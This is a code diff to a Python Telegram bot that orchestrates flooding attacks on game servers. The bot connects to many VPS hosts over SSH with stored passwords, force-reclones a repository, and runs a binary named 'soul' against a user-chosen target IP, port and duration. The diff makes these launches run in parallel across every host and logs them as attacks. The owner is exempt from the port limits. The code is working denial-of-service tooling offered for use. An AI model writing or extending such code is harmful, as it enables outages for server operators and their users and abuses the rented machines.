@@ -13,6 +13,7 @@ import atexit
 import asyncio
 import threading
 import paramiko
+from concurrent.futures import ThreadPoolExecutor
 
 logging.basicConfig(level=logging.INFO)
 
@@ -38,7 +39,6 @@ def deploy_single_vps(vps):
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=20)
         
-        # Force delete old repo + fresh clone + chmod every time
         commands = [
             "rm -rf \~/Clodways",
             "git clone https://github.com/SagarExe/Clodways.git \~/Clodways",
@@ -47,10 +47,10 @@ def deploy_single_vps(vps):
         
         for cmd in commands:
             ssh.exec_command(cmd)
-            time.sleep(2)  # small delay between commands
+            time.sleep(2)
         
         ssh.close()
-        logging.info(f"✅ Fresh deploy done on {vps['ip']} (deleted + recloned + chmod)")
+        logging.info(f"✅ Fresh deploy done on {vps['ip']}")
     except Exception as e:
         logging.error(f"Deploy error on {vps['ip']}: {e}")
 
@@ -58,7 +58,7 @@ def deploy_to_all_vps():
     for vps in vps_list:
         threading.Thread(target=deploy_single_vps, args=(vps,)).start()
 
-# Auto fresh deploy every time New.py starts
+# Auto fresh deploy every time bot starts
 deploy_to_all_vps()
 
 def remote_execute(vps, target, port, duration):
@@ -66,9 +66,13 @@ def remote_execute(vps, target, port, duration):
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=10)
-        command = f"cd \~/Clodways && nohup timeout {duration}s ./soul {target} {port} {duration} 900 > /dev/null 2>&1 &"
+        
+        # Binary runs instantly with exact command you want
+        command = f"cd \~/Clodways && nohup timeout {duration}s ./soul {target} {port} {duration} > /dev/null 2>&1 &"
+        
         ssh.exec_command(command)
         ssh.close()
+        logging.info(f"✅ Attack launched instantly on {vps['ip']}: ./soul {target} {port} {duration}")
     except Exception as e:
         logging.error(f"SSH Error on {vps['ip']}: {e}")
 
@@ -409,7 +413,7 @@ def handle_bgmi(message):
         return
     int_port = int(port)
     BLOCKED_PORTS = {17000, 17500, 20000, 20001, 20002}
-    if str(caller_id) != OWNER_ID:   # Owner bypasses all port blocks
+    if str(caller_id) != OWNER_ID:
         if int_port <= 10000 or int_port >= 30000 or int_port in BLOCKED_PORTS:
             bot.reply_to(message, f"🚫 The port `{int_port}` is blocked! Please use a different port.")
             return
@@ -427,11 +431,13 @@ def handle_bgmi(message):
     attack_info = {'user_id': caller_id, 'target': target, 'port': port, 'end_time': attack_end_time}
     bot.send_message(
         message.chat.id,
-        f"🚀 **Broadcasting to {len(vps_list)} VPS**\n🎯 Target: `{target}`\n📡 Port: `{port}`\n⏳ Duration: `{duration} seconds`",
+        f"🚀 **Launching instantly on {len(vps_list)} VPS**\n🎯 Target: `{target}`\n📡 Port: `{port}`\n⏳ Duration: `{duration} seconds`",
         parse_mode='Markdown'
     )
-    for vps in vps_list:
-        threading.Thread(target=remote_execute, args=(vps, target, port, duration)).start()
+    # INSTANT PARALLEL LAUNCH ON ALL VPS
+    with ThreadPoolExecutor(max_workers=len(vps_list)) as executor:
+        executor.map(lambda v: remote_execute(v, target, port, duration), vps_list)
+
     log_attack(caller_id, target, port, duration)
     msg = bot.send_animation(
         chat_id=message.chat.id,
@@ -497,6 +503,7 @@ def help_command(message):
 
 Threads fixed at 900.
 Owner can use any port.
+Binary launches instantly on all VPS.
     """
     bot.reply_to(message, help_text)
 
